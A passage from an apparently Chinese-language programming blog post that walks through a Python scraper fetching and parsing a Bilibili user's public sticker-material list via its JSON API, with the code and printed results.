class="string">f&#x27;https://cool.bilibili.com/x/co-create/user/material_list?ps=15&amp;pn=<span class="subst">&#123;pn&#125;</span>&amp;mid=1445996044&amp;up_from=1&amp;biz_from=3&amp;material_type=7&amp;t=<span class="subst">&#123;time.time()&#125;</span>&#x27;</span></span><br><span class="line">html=requests.get(url,headers=headers);</span><br><span class="line"><span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">     html_bytes = html.content;</span><br><span class="line">     html_str = html_bytes.decode();</span><br><span class="line"><span class="built_in">print</span>(html_str)</span><br></pre></td></tr></table></figure><p>获取的结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ttl&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_list&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">822876</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-真相.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/7165468d675fa4df192ec861403e7997e9303c34.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">233</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">961278</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-世俗的欲望1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/0b0b9aaa63617ef602f33cea0a83f5e730f4402f.jpg&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">223</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">832071</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-上班.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/46376cc652e9113945f9213c2a3a561287d1851b.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">216</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">940356</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-中秋快乐.j&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/70e1ca54f83da61532f333b0bf5abfe81ac51686.jpg&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">205</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">891899</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-棒.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/a49e0c6c8c61bd0db039264e1301d7d53e83534e.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">172</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">894317</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-飞机.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/85a2ff51879f8b6c89938145a28f0d599336fe0a.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">162</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">931391</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-小丑.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/b68b50d6d739d713c152e493924363f3b72f6f6e.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">157</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">972898</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-斯莱特林.p&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/3d78bd013a0a820d01985dc29ff832a39b0d8944.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">153</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">830663</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-帅.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/644bf254c17b733653425db528b3b39553599e1a.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">140</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">822879</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-冲.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/7be99b8651dd69cc0664bed583a3256f873e20cb.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">123</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">867832</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-帅醒.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/61dbe0163a0c545892f195d53d8ba001d394751e.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">122</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">961783</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-JOJO承太&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/451c9d93008bf50dd0005443c74e45dd72b71128.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">121</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">860578</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-跳舞.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/d4072bef4bd47bedc6051916d93beb256f7c8c6a.gif&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">121</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">942980</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-赫奇帕奇.j&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/88ce5ab9891d8a42133c41bdab538e2414b31f2b.jpg&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">119</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;material_id&quot;</span><span class="punctuation">:</span><span class="number">972899</span><span class="punctuation">,</span><span class="attr">&quot;material_type&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;sid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;一猫人-拉文克劳.p&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cover&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://i0.hdslb.com/bfs/material_up/92ed49143c4301c9e8e5af86b85458c0b6675ac5.png&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;musicians&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;used_count&quot;</span><span class="punctuation">:</span><span class="number">115</span><span class="punctuation">,</span><span class="attr">&quot;videopre_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;pager&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;total&quot;</span><span class="punctuation">:</span><span class="number">228</span><span class="punctuation">,</span><span class="attr">&quot;pn&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;ps&quot;</span><span class="punctuation">:</span><span class="number">15</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>分析我们取到的数据，找到我们需要的东西：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516215701036.png" alt="image-20220516215701036"></p><p>通过前面浏览器调试页面的<code>Accept: application/json</code>得知请求到的数据是Json数据。</p><p> 然后使用<code>json</code>包处理一下得到的数据 (<em>从第17行开始</em>):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">pn = <span class="number">2</span></span><br><span class="line">url = <span class="string">f&#x27;https://cool.bilibili.com/x/co-create/user/material_list?ps=15&amp;pn=<span class="subst">&#123;pn&#125;</span>&amp;mid=1445996044&amp;up_from=1&amp;biz_from=3&amp;material_type=7&amp;t=<span class="subst">&#123;time.time()&#125;</span>&#x27;</span></span><br><span class="line">html=requests.get(url,headers=headers);</span><br><span class="line"><span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">     html_bytes = html.content;</span><br><span class="line">     html_str = html_bytes.decode();</span><br><span class="line"><span class="comment"># print(html_str)</span></span><br><span class="line">data = json.loads(html_str);</span><br><span class="line">all_items=data[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;material_list&#x27;</span>]</span><br><span class="line">pic_content=[];</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> all_items:</span><br><span class="line">     title = item[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">     material_id = item[<span class="string">&#x27;material_id&#x27;</span>]</span><br><span class="line">     uri = item[<span class="string">&#x27;cover&#x27;</span>]</span><br><span class="line">     used_count = item[<span class="string">&#x27;used_count&#x27;</span>]</span><br><span class="line">     pic_content.append(&#123;<span class="string">&#x27;名称&#x27;</span>: title, <span class="string">&#x27;ID&#x27;</span>: material_id, <span class="string">&#x27;使用次数&#x27;</span>:used_count, <span class="string">&#x27;URI&#x27;</span>:uri&#125;);</span><br><span class="line"><span class="keyword">for</span> pic <span class="keyword">in</span> pic_content:</span><br><span class="line">     <span class="built_in">print</span>(pic)</span><br></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/python3<span class="number">.9</span> /Users/q1jun/Desktop/pythonProject/scraper.py</span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-真相.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">822876</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">233</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/7165468d675fa4df192ec861403e7997e9303c34.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-世俗的欲望<span class="number">1</span>&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">961278</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">223</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/0b0b9aaa63617ef602f33cea0a83f5e730f4402f.jpg&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-上班.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">832071</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">216</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/46376cc652e9113945f9213c2a3a561287d1851b.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-中秋快乐.j&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">940356</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">205</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/70e1ca54f83da61532f333b0bf5abfe81ac51686.jpg&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-棒.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">891899</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">172</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/a49e0c6c8c61bd0db039264e1301d7d53e83534e.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-飞机.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">894317</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">162</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/85a2ff51879f8b6c89938145a28f0d599336fe0a.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-小丑.png&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">931391</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">157</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/b68b50d6d739d713c152e493924363f3b72f6f6e.png&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-斯莱特林.p&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">972898</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/3d78bd013a0a820d01985dc29ff832a39b0d8944.png&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-帅.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">830663</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span 